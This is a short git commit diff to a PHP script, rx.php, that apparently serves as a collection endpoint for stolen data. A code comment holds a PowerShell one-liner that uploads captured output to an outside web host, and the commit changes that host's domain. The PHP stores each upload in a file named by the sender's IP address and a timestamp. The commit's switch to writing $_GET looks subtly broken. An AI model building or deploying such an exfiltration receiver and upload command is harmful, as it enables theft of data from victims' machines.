10a85409133d02ceaff3375956d0022133191efb
Kenfrost1987 <anthony.wratten@kenfrost1987.com.au>
2017-03-30 15:34:23 +1000

    change rx. type GET

--- web/rx.php
+++ web/rx.php
@@ -2,9 +2,9 @@
 
 /* 
  * 
- * powershell "IEX (New-Object Net.WebClient).UploadString('http://darren.kitchen/rx.php', $output)"
+ * powershell "IEX (New-Object Net.WebClient).UploadString('http://office2john.online/rx.php', $output)"
  */
 
 $file = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".txt";
-file_put_contents("uploads/".$file, file_get_contents("php://input"));
-
+//file_put_contents("uploads/".$file, file_get_contents("php://input"));
+file_put_contents("uploads/".$file, $_GET);
